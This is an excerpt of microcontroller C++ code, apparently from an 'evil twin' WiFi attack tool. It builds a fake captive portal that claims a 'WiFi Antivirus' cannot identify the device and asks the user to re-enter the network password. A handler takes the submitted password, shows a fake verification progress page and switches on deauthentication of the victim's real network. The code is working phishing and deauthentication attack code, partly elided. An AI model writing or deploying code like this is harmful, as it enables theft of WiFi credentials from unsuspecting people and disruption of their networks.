...
#define SUBTITLE "Please Verify YourSelf (Security Enhancement Feature)"
#define TITLE "&#9888; WiFi Antivirus not able to identify your device directly."
#define BODY "<h3>You are trying to connect with secure WiFi.</h3><br><h4>So, Please Re-Enter your password ,<br> & verify yourself.</h4>"
...
String footer() {
  String a = String(_selectedNetwork.ssid);
  return "</div><div class=q><a><center>" + a + " &#169; AI Security-All Rights Reserved.</center></a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:(New Security feature)</label>" +
...
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    if (webServer.hasArg("password")) {
      ...
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>We are Verifying You, Thank You for Your Patience.... <br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
